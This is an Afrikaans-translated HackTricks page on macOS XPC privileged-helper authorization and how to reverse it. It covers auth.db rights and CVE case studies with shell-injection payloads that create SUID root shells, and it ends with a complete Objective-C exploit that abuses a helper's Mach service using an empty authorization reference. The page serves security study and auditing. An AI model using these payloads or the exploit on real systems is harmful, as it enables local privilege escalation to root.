# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple stel ook ’n ander manier voor om te authenticateer of die connecting process **permissions het om ’n blootgestelde XPC method te call**.

Wanneer ’n application **actions as a privileged user moet execute**, installeer dit gewoonlik, eerder as om die app as ’n privileged user te run, ’n HelperTool as root as ’n XPC service wat vanaf die app gecall kan word om daardie actions uit te voer. Die app wat die service call, moet egter genoeg authorization hê.

### ShouldAcceptNewConnection altyd YES

’n Voorbeeld kan in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) gevind word. In `App/AppDelegate.m` probeer dit om aan die **HelperTool** te **connect**. En in `HelperTool/HelperTool.m` sal die **`shouldAcceptNewConnection`**-function **geen** van die vereistes wat voorheen aangedui is, **check nie**. Dit sal altyd YES return:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Vir meer inligting oor hoe om hierdie kontrole behoorlik te konfigureer:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Toepassingsregte

Daar is egter **magtiging wat plaasvind wanneer ’n metode van die HelperTool geroep word**.

Die funksie **`applicationDidFinishLaunching`** van `App/AppDelegate.m` sal ’n leë magtigingsverwysing skep nadat die toepassing begin het. Dit behoort altyd te werk.\
Daarna sal dit probeer om **sommige regte** by daardie magtigingsverwysing te voeg deur `setupAuthorizationRights` aan te roep:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die funksie `setupAuthorizationRights` vanaf `Common/Common.m` sal die toepassing se regte in die auth-databasis `/var/db/auth.db` stoor. Let daarop dat dit slegs die regte sal byvoeg wat nog nie in die databasis bestaan nie:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die funksie `enumerateRightsUsingBlock` word gebruik om toepassings se toestemmings te verkry, wat in `commandInfo` gedefinieer word:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Dit beteken dat die toestemmings wat binne `commandInfo` verklaar is, aan die einde van hierdie proses in `/var/db/auth.db` gestoor sal word. Let daarop dat jy daar vir **elke metode** wat **autentisering vereis**, die **toestemmingsnaam** en die **`kCommandKeyAuthRightDefault`** kan vind. Laasgenoemde **dui aan wie hierdie reg kan verkry**.

Daar is verskillende omvangsvlakke om aan te dui wie toegang tot ’n reg kan verkry. Sommige daarvan word in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) gedefinieer (jy kan [almal hier vind](https://www.dssw.co.uk/reference/authorization-rights/)), maar as opsomming:

<table><thead><tr><th width="284.3333333333333">Naam</th><th width="165">Waarde</th><th>Beskrywing</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Enigiemand</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Die huidige gebruiker moet ’n admin wees (binne die admin-groep)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Vra die gebruiker om te autentiseer.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Vra die gebruiker om te autentiseer. Hy moet ’n admin wees (binne die admin-groep)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Spesifiseer reëls</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Spesifiseer ekstra opmerkings oor die reg</td></tr></tbody></table>

### Regteverifikasie

In `HelperTool/HelperTool.m` kontroleer die funksie **`readLicenseKeyAuthorization`** of die oproeper gemagtig is om **so ’n metode uit te voer** deur die funksie **`checkAuthorization`** aan te roep. Hierdie funksie kontroleer of die **authData** wat deur die oproepende proses gestuur is, ’n **korrekte formaat** het, en kontroleer dan **wat nodig is om die reg te verkry** om die spesifieke metode aan te roep. As alles goed verloop, sal die **teruggestuurde `error` `nil` wees**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Let daarop dat die funksie `authorizationRightForCommand`, om **die vereistes na te gaan om die reg** te verkry om daardie metode aan te roep, slegs die voorheen genoemde objek **`commandInfo`** sal nagaan. Daarna sal dit **`AuthorizationCopyRights`** aanroep om na te gaan **of dit die regte het** om die funksie aan te roep (let daarop dat die vlae interaksie met die gebruiker toelaat).

In hierdie geval, om die funksie `readLicenseKeyAuthorization` aan te roep, word `kCommandKeyAuthRightDefault` gedefinieer as `@kAuthorizationRuleClassAllow`. Dus **kan enigiemand dit aanroep**.

### DB-inligting

Daar is genoem dat hierdie inligting in `/var/db/auth.db` gestoor word. Jy kan al die gestoorde reëls met die volgende lys:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dan kan jy nagaan wie toegang tot die reg het met:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Toegeeflike regte

Jy kan **alle toestemmingskonfigurasies** [**hier vind**](https://www.dssw.co.uk/reference/authorization-rights/), maar die kombinasies wat nie gebruikersinteraksie vereis nie, sou wees:

1. **'authenticate-user': 'false'**
- Dit is die mees direkte sleutel. As dit op `false` gestel is, spesifiseer dit dat 'n gebruiker nie authentication hoef te verskaf om hierdie reg te verkry nie.
- Dit word gebruik **in kombinasie met een van die 2 onderstaande opsies of deur 'n groep aan te dui** waaraan die gebruiker moet behoort.
2. **'allow-root': 'true'**
- As 'n gebruiker as die root-gebruiker werk (wat verhoogde toestemmings het), en hierdie sleutel op `true` gestel is, kan die root-gebruiker moontlik hierdie reg verkry sonder verdere authentication. Om egter tipies root-gebruikerstatus te verkry, vereis reeds authentication, dus is dit vir die meeste gebruikers nie 'n "geen authentication"-scenario nie.
3. **'session-owner': 'true'**
- As dit op `true` gestel is, sal die eienaar van die sessie (die gebruiker wat tans aangemeld is) outomaties hierdie reg kry. Dit kan addisionele authentication omseil as die gebruiker reeds aangemeld is.
4. **'shared': 'true'**
- Hierdie sleutel verleen nie regte sonder authentication nie. As dit op `true` gestel is, beteken dit eerder dat, sodra die reg ge-authentiseer is, dit tussen verskeie prosesse gedeel kan word sonder dat elkeen weer authentication hoef te doen. Die aanvanklike verlening van die reg sal egter steeds authentication vereis, tensy dit met ander sleutels soos `'authenticate-user': 'false'` gekombineer word.

Jy kan [**hierdie script gebruik**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) om die interessante regte te verkry:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Gevallestudies oor Authorization Bypass

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Die geprivilegeerde Mach-diens `com.acustica.HelperTool` aanvaar elke verbinding, en sy `checkAuthorization:`-roetine roep `AuthorizationCopyRights(NULL, …)` aan, sodat enige 32-grepe blob slaag. `executeCommand:authorization:withReply:` voer daarna aanvaller-beheerde, komma-geskeide strings aan `NSTask` as root, wat payloads soos die volgende moontlik maak:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
triviaal ’n SUID root shell skep. Besonderhede in [hierdie write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Die listener gee altyd YES terug, en dieselfde NULL `AuthorizationCopyRights`-patroon verskyn in `checkAuthorization:`. Die metode `exchangeAppWithReply:` voeg aanvallerinvoer twee keer in ’n `system()`-string saam, dus lewer die inspuiting van shell-metakarakters in `appPath` (bv. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) root code execution via die Mach service `com.plugin-alliance.pa-installationhelper`. Meer inligting [hier](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Wanneer ’n audit uitgevoer word, word `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` geskep, die Mach service `com.jamf.complianceeditor.helper` word blootgestel, en `-executeScriptAt:arguments:then:` word uitgevoer sonder om die oproeper se `AuthorizationExternalForm` of code signature te verifieer. ’n Triviale exploit `AuthorizationCreate`s ’n leë reference, verbind met `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`, en roep die metode aan om arbitrêre binaries as root uit te voer. Volledige reversing-notas (plus PoC) is in [Mykola Grymalyuk se write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 en 7.4.0–7.4.2 het vervaardigde XPC-boodskappe aanvaar wat ’n bevoorregte helper bereik het wat geen authorization gates gehad het nie. Omdat die helper sy eie bevoorregte `AuthorizationRef` vertrou het, kon enige plaaslike gebruiker wat boodskappe na die service kon stuur, dit dwing om arbitrêre konfigurasieveranderings of commands as root uit te voer. Besonderhede in [SentinelOne se advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Wenke vir vinnige triage

- Wanneer ’n app beide ’n GUI en helper insluit, vergelyk hul code requirements en kyk of `shouldAcceptNewConnection` die listener met `-setCodeSigningRequirement:` sluit (of `SecCodeCopySigningInformation` valideer). Ontbrekende checks lei gewoonlik tot CWE-863-scenario’s soos die Jamf-geval. ’n Vinnige kykie lyk soos:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Vergelyk wat die helper dink dit autoriseer met wat die client verskaf. Wanneer jy reverse, stel ’n breakpoint op `AuthorizationCopyRights` en bevestig dat die `AuthorizationRef` van `AuthorizationCreateFromExternalForm` afkomstig is (deur die client verskaf), eerder as uit die helper se eie bevoorregte konteks. Andersins het jy waarskynlik ’n CWE-863-patroon soortgelyk aan die gevalle hierbo gevind.

## Reversing van Authorization

### Kontroleer of EvenBetterAuthorization gebruik word

As jy die funksie **`[HelperTool checkAuthorization:command:]`** vind, gebruik die proses waarskynlik die voorheen genoemde skema vir authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Hierdie funksie roep funksies soos `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` en `AuhtorizationFree` aan. Dit beteken dat dit [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) gebruik.

Gaan die **`/var/db/auth.db`** na om te sien of dit moontlik is om toestemming te verkry om ’n bevoorregte aksie uit te voer sonder gebruikersinteraksie.

### Protocolkommunikasie

Daarna moet jy die protocol-skema vind om kommunikasie met die XPC service te kan bewerkstellig.

Die funksie **`shouldAcceptNewConnection`** dui die geëksporteerde protocol aan:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In hierdie geval het ons dieselfde as in EvenBetterAuthorizationSample; [**sien hierdie lyn**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Nadat jy die naam van die gebruikte protocol ken, is dit moontlik om sy **header-definisie te dump** met:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Laastens hoef ons net die **naam van die blootgestelde Mach Service** te ken om kommunikasie daarmee te bewerkstellig. Daar is verskeie maniere om dit te vind:

- In die **`[HelperTool init]`**, waar jy die Mach Service kan sien wat gebruik word:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- In die launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit-voorbeeld

In hierdie voorbeeld word die volgende geskep:

- Die definisie van die protocol met die functions
- ’n Leë auth om toegang te versoek
- ’n Verbinding met die XPC service
- ’n Oproep na die function indien die verbinding suksesvol was
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Other XPC privilege helpers abused

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## Verwysings

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac Privilege Escalation Flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Acustica Audio HelperTool XPC Service Local Privilege Escalation in Aquarius Desktop on macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
